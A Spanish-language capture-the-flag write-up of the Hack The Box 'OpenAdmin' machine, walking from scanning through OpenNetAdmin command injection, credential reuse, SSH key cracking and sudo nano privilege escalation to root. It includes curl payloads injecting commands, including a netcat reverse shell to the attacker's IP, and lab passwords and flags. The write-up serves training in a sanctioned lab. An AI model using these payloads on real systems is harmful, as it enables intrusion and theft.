---
tags:
title: OpenAdmin- Easy (HTB)
permalink: /OpenAdmin-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introducción

# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.253.214
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 01:02 -03
Nmap scan report for 10.129.253.214
Host is up (0.76s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.76 seconds
```

## Website / Port 80

En la pagina principal veo un servido de `Apache`.

![image-center](/assets/images/{E715B59F-EC6E-4799-A321-C3E04FA9030F}.png)

### Feroxbuster enumeration

```bash
feroxbuster -u http://openadmin.htb

[..snip]

admin.htb/sierra/vendors/revolution/fonts => http://openadmin.htb/sierra/vendors/revolution/fonts/
[####################] - 12m   240254/240254  0s      found:154     errors:15943  
[####################] - 8m     30000/30000   59/s    http://openadmin.htb/ 
[####################] - 8m     30000/30000   60/s    http://openadmin.htb/music/ 
[####################] - 4s     30000/30000   6900/s  http://openadmin.htb/music/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   9872/s  http://openadmin.htb/music/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   5529/s  http://openadmin.htb/music/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   37083/s http://openadmin.htb/music/img/songs/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   37594/s http://openadmin.htb/music/img/premium/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   30395/s http://openadmin.htb/music/img/icons/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   6596/s  http://openadmin.htb/music/img/concept/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 4s     30000/30000   6878/s  http://openadmin.htb/music/img/blog/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   14486/s http://openadmin.htb/music/img/playlist/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 8m     30000/30000   60/s    http://openadmin.htb/artwork/ 
[####################] - 10s    30000/30000   2939/s  http://openadmin.htb/artwork/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4061/s  http://openadmin.htb/artwork/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 9s     30000/30000   3199/s  http://openadmin.htb/artwork/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4052/s  http://openadmin.htb/artwork/fonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   39164/s http://openadmin.htb/artwork/fonts/flaticon/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   6412/s  http://openadmin.htb/artwork/css/bootstrap/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 8s     30000/30000   3863/s  http://openadmin.htb/music/Source/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 9m     30000/30000   53/s    http://openadmin.htb/sierra/ 
[####################] - 9m     30000/30000   54/s    http://openadmin.htb/sierra/js/ 
[####################] - 7s     30000/30000   4001/s  http://openadmin.htb/sierra/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 9m     30000/30000   54/s    http://openadmin.htb/sierra/img/ 
[####################] - 7s     30000/30000   4062/s  http://openadmin.htb/sierra/fonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4068/s  http://openadmin.htb/sierra/img/banner/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 6s     30000/30000   4719/s  http://openadmin.htb/sierra/img/portfolio/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 9m     30000/30000   53/s    http://openadmin.htb/sierra/img/icon/ 
[####################] - 7s     30000/30000   4036/s  http://openadmin.htb/sierra/vendors/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4066/s  http://openadmin.htb/sierra/vendors/isotope/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 9m     30000/30000   53/s    http://openadmin.htb/sierra/vendors/revolution/ 
[####################] - 2s     30000/30000   15536/s http://openadmin.htb/sierra/vendors/owl-carousel/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4062/s  http://openadmin.htb/sierra/img/testimonials/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   36991/s http://openadmin.htb/sierra/img/team/ => Directory listing (add --scan-dir-listings to scan)
```

El escaneo me revela alguna rutas, donde corren otras paginas `web`.
### sierra

En el directorio `/sierra` parece ser que corre una pagina web.

![image-center](/assets/images/{3C41138F-14DA-49ED-8953-89039500A7E6}.png)

Tengo que adelantar que en este apartado no encontré nada de nada.
## Shell as www-data
### music

En el directorio `/music` también corre otra pagina web, esta en especial no tiene casi nada, excepto el botón de `login` que me redirige a otra pagina.

![image-center](/assets/images/{27D09BAC-7E7C-4053-98C2-1301303D1793}.png)
### ona

Al tocar en `login` soy redirigido a esta interfaz de `ONA (Open Net Admin)` .

![image-center](/assets/images/{D96A15BA-4677-4E49-8188-AAE21FAD6967}.png)

En la misma pagina identifico la versión `v.18.1.1` y buscando en internet me encuentro con el siguiente [enlace](https://nvd.nist.gov/vuln/detail/cve-2019-25065) el cual se trata del `CVE-2019-25065`.El mismo se trata de una inyeccion de comandos, se relata mas detalladamente en este [PoC](https://vuldb.com/?id.146798).
En mi caso lo tengo que amoldar a mi web la cual corre en `http://openadmin.htb/ona/`, a continuacion una prueba, intentando si desde la pagina tengo traza `icmp` a mi maquina.

```bash
curl http://openadmin.htb/ona/ -d 'xajax=window_submit&xajaxr=1764653957449&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E; echo \"BEGIN\";$(ping -c 1 10.10.17.19);echo\"END\"&xajaxargs[]=ping'   
<?xml version="1.0" encoding="utf-8" ?><xjx><cmd n="js"><![CDATA[removeElement('tooltips_results');]]></cmd><cmd n="ce" t="window_container" p="tooltips_results"><![CDATA[div]]></cmd><cmd n="js"><!
<SNIP>
```

Y con éxito logro la conexión.

```bash
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:46:02.920942 IP openadmin.htb > 10.10.17.19: ICMP echo request, id 17984, seq 1, length 64
02:46:02.922344 IP 10.10.17.19 > openadmin.htb: ICMP echo reply, id 17984, seq 1, length 64
```

Ahora solo me queda enviarme una `shell` a mi maquina, para eso use el siguiente comando:

```bash
curl http://openadmin.htb/ona/ -d 'xajax=window_submit&xajaxr=1764653957449&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E; echo \"BEGIN\";$(busybox nc 10.10.17.19 4444 -e /bin/bash);echo\"END\"&xajaxargs[]=ping'
```

Y es así como desde mi `listener` recibo la conexión como el usuario `www-data`.

```
```bash
 nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.253.214] 33664
whoami
www-data
```
## Shell as jimmy

En el directorio `/opt/ona/www/local/config` encontré el siguiente archivo con credenciales para el servicio `mysql`.

```php
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
### MySQL 

Usando las mismas credenciales me conecto a este servicio.

```bash
www-data@openadmin:/opt/ona/www/local/config$ mysql -u ona_sys -pn1nj4W4rri0R!
```

Listo las bases de datos con el siguiente comando:

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)
```

Selecciono la base de datos de `ona`.

```sql
mysql> use ona_default;
```
### Creds

Y ahora ya puedo listar tablas.

```sql
Database changed
mysql> show tables;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)
```

Ahora como veo la tabla `users` puedo obtener los datos de la misma con la siguiente `query`.

```bash
mysql> select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2025-12-02 05:52:20 | 2025-12-02 05:52:20 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)
```

Sin embargo estos hashes me dan como passwords:

![image-center](/assets/images/{7C964694-72D9-4D95-82AF-ED5786224249}.png)

Probando migrar al usuario con alguna de estas no logro tener acceso, pero si pude con la password de la base de datos de `mysql`: `n1nj4W4rri0R!`.

```bash
www-data@openadmin:/opt/ona/www/local/config$ su jimmy
Password: 
jimmy@openadmin:/opt/ona/www/local/config$ 
```
## Shell as root
### Enumeration

Para obtener una `shell` mas interactiva use las credenciales para loguearme por `ssh`.

```bash
ssh jimmy@openadmin.htb           
<SNIP>
jimmy@openadmin.htb's password: 
<SNIP>
jimmy@openadmin:~$ 
```
### Interesting group

Viendo los grupos del usuario `jimmy` veo que pertenece a `internal`.

```bash
jimmy@openadmin:/opt/ona/www/local/config$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

Asi que puedo buscar por ejecutables o archivos los cuales este grupo sea propietario.

```bash
jimmy@openadmin:/opt/ona/www/local/config$ find / -group internal 2>/dev/null 
/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
```
### Index

```php
jimmy@openadmin:~$ cat /var/www/internal/index.php
<?php
   ob_start();
   session_start();
?>
<SNIP>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
<SNIP>
```

Dentro del `index` veo una hash en formato `sha-512`

![image-center](/assets/images/{B67E8BB7-F0B9-40A3-82FF-299BB6F78D45}.png)

Además veo un servicio que externamente no esta expuesto en el puerto `52846`.

```bash
jimmy@openadmin:/var/www$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -  
```

Además dentro de el `main` veo que sea guarda una clave privada para el usuario `joanna`.

Hago `Port Forwarding` para poder tener acceso al servicio que corre internamente en la maquina.

```bash
ssh jimmy@openadmin.htb -L 52846:127.0.0.1:52846 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jimmy@openadmin.htb's password: 
```
### SSH Key

Me pide un usuario y password.
Probé las creds para el usuario `jimmy` pero no funcionan pero sin embargo si son validas para el usuario `joanna`.

![image-center](/assets/images/{0F78853D-C1A9-44E5-AA15-A1D0CB154B69}.png)

Veo la clave de `joanna` y con una password, la que parece que protege esta clave.

![image-center](/assets/images/{0C17B7C2-9D48-4B4B-859A-491D6D31B9A2}.png)
### Crack password

Veo que logueadome me pide la pass y proporcionando `ninja` veo que no es correcta.

```bash
ssh joanna@openadmin.htb -i id_Rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_Rsa': 
Enter passphrase for key 'id_Rsa': 
Enter passphrase for key 'id_Rsa': 
joanna@openadmin.htb's password: 
Permission denied, please try again.
joanna@openadmin.htb's password: 
```

Por lo que ahora con `ssh2john` convierto la clave `RSA` en un hash para ver cual es la verdadera password que protege la misma.

```bash
ssh2john id_rsa > hash.txt
```

Y ahora rompemos el mismo hash.

```bash                                           
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)     
1g 0:00:00:01 DONE (2025-12-02 03:15) 0.6410g/s 6137Kp/s 6137Kc/s 6137KC/s bloodofyouth..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### SSH

Y ahora pude acceder usando esa clave.

```bash
 ssh -i id_rsa joanna@openadmin.htb                       
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec  2 06:18:05 UTC 2025

  System load:  0.0               Processes:             190
  Usage of /:   31.4% of 7.81GB   Users logged in:       1
  Memory usage: 16%               IP address for ens160: 10.129.253.214
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ cat user.txt 
e824ce02f5156f55e0f81b5e9b96efc2

```
## Shell as root

### Enumeration

El usuario `joanna` puede ejecutar `nano` como cualquier usuario, en mi caso lo ejecuto son `sudo` para hacerlo como `root`.

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Es así como puedo ir a la pagina de [GTFObins](https://gtfobins.github.io/gtfobins/nano/#sudo) donde ahí mismo muestra el paso a paso para escalar a `root`.

Primero ejecuto el binario en el archivo que puedo que es `/opt/priv`.

```bash
/bin/nano /opt/priv
```

Después de presionar `Ctrl` + `R` y `Ctrl` + `X` en la interfaz de nano ejecuto el siguiente comando.

![image-center](/assets/images/{CE7CA3AB-93D6-4C3C-A6C0-872A39CF7245}.png)

Y es así como ya puedo ser `root`, y como la interfaz esta media bug, le proporcione el bit `SUID` a la `bash` para asi desde otra sesión convertirme en root
```
# whoamielp                                                                                  ^X Read File
rootancel                                                                                    M-F New Buffer
# ls
user.txt
# chmod u+s /bin/bash
# ls -la /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Me convierto en `root`.

```bash
jimmy@openadmin:~$ bash -p
bash-4.4# whoami
root
```

```bash
bash-4.4# cat /root/root.txt 
415f2074997d766ebe229377d958d92f
```

`~Happy Hacking.`